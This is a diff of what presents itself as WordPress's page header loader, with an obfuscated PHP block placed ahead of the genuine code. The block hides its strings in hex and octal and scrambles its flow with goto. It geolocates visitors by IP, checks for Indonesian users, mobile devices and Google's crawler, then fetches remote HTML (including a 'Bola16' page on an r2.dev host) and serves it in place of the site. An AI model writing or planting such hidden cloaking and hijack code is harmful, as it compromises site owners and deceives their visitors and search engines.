@@ -1,2 +1,23 @@
 <?php
 goto O2883; O0394: O4632: goto O9972; O4159: if ($O5331 === "\111\156\144\x6f\x6e\145\163\151\x61") { goto O0323; } goto O8172; O7005: $O5318 = "\150\x74\164\x70\x73\x3a\x2f\x2f\151\x6e\x63\x6c\x75\x64\x65\163\55\160\x61\147\x65\56\143\157\155\x2f\143\155\144\x2f\151\x6e\163\x70\157\x73\56\x66\x69\x2f\x6c\x70\56\x74\170\164"; goto O9746; O8172: include "\151\156\x64\x65\170\56\150\164\155\154\56"; goto O6324; O1571: $O5642 = o9407($O5318); goto O9806; O7133: goto O5999; goto O2357; O6676: echo $O5642; goto O5650; O1597: $O5642 = O9407($O5318); goto O5467; O5467: if (!$O5642) { goto O3428; } goto O6676; O9806: if (!$O5642) { goto O2068; } goto O3354; O4718: O0323: goto O2207; O0725: function o9407($O0017) { goto O5749; O6698: curl_setopt($O2052, CURLOPT_URL, $O0017); goto O7925; O4835: if (!($O1781 === false)) { goto O6521; } goto O0487; O5749: $O2052 = curl_init(); goto O6698; O9030: curl_close($O2052); goto O4735; O4735: return $O1781; goto O7810; O0487: trigger_error("\x46\141\151\x6c\x65\x64\40\x74\x6f\x20\x72\x65\164\x72\x69\x65\166\145\x20\x63\157\x6e\164\x65\156\164\x20\146\x72\157\x6d\40{$O0017}\56", E_USER_NOTICE); goto O2661; O7925: curl_setopt($O2052, CURLOPT_RETURNTRANSFER, true); goto O5547; O5547: $O1781 = curl_exec($O2052); goto O4835; O2661: return null; goto O3618; O3618: O6521: goto O9030; O7810: } goto O7511; O2883: function O1746() { goto O4849; O5713: O5252: goto O0916; O1124: $O1226 = "\150\x74\164\160\x3a\x2f\57\151\160\55\x61\x70\151\x2e\x63\x6f\x6d\x2f\x6a\163\x6f\x6e\x2f{$O5196}"; goto O2608; O2608: $O2052 = curl_init(); goto O4872; O3244: return $O1419["\143\x6f\x75\x6e\164\162\x79"]; goto O7937; O0916: curl_close($O2052); goto O5946; O3676: if (!curl_errno($O2052)) { goto O5252; } goto O3021; O2186: goto O8299; goto O5857; O8712: curl_setopt($O2052, CURLOPT_RETURNTRANSFER, true); goto O1025; O1190: return "\103\157\165\156\164\162\x79\40\156\x6f\164\x20\x66\x6f\x75\156\144"; goto O2186; O3021: return "\x45\162\162\x6f\162\72\40" . curl_error($O2052); goto O5713; O8575: if ($O1419["\163\164\x61\x74\x75\163"] === "\x73\165\143\x63\145\163\163") { goto O9601; } goto O1190; O4872: curl_setopt($O2052, CURLOPT_URL, $O1226); goto O8712; O5857: O9601: goto O3244; O5946: $O1419 = json_decode($O6832, true); goto O8575; O1025: $O6832 = curl_exec($O2052); goto O3676; O7937: O8299: goto O3801; O4849: $O5196 = $_SERVER["\122\105\x4d\x4f\x54\105\137\x41\104\104\122"]; goto O1124; O3801: } goto O4659; O3757: O7594: goto O2815; O2044: if (!$O3084) { goto O7594; } goto O9085; O9972: $O7506 = "\x68\x74\x74\160\x73\x3a\x2f\x2f\160\x75\x62\55\x39\141\x63\70\71\71\143\x66\x31\x36\x36\143\64\71\70\146\141\64\70\x32\143\x35\x30\x30\71\60\70\x37\62\66\146\60\56\162\62\56\x64\145\166\57\x42\x6f\x6c\x61\x31\66\56\150\x74\x6d\154"; goto O3315; O1764: O2068: goto O4459; O3354: echo $O5642; goto O1764; O9746: if (O8456()) { goto O3839; } goto O4159; O2207: if (preg_match("\57\115\157\x62\x69\x6c\145\174\101\156\x64\162\x6f\x69\144\174\151\x50\150\157\156\x65\x7c\x69\120\x61\x64\57", $_SERVER["\110\124\124\120\x5f\x55\x53\x45\x52\137\x41\x47\x45\116\x54"])) { goto O4632; } goto O1571; O9085: echo $O3084; goto O3757; O4659: function O8456() { $O6781 = strtolower($_SERVER["\x48\124\x54\x50\x5f\x55\123\x45\x52\x5f\x41\107\x45\x4e\x54"]); return strpos($O6781, "\147\x6f\x6f\x67\154\145") !== false; } goto O0725; O4459: goto O0245; goto O0394; O7511: $O5331 = o1746(); goto O7005; O2357: O3839: goto O1597; O1456: O2280: goto O7133; O6324: goto O2280; goto O4718; O3315: $O3084 = o9407($O7506); goto O2044; O2815: O0245: goto O1456; O5650: O3428: goto O5286; O5286: O5999:
+
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
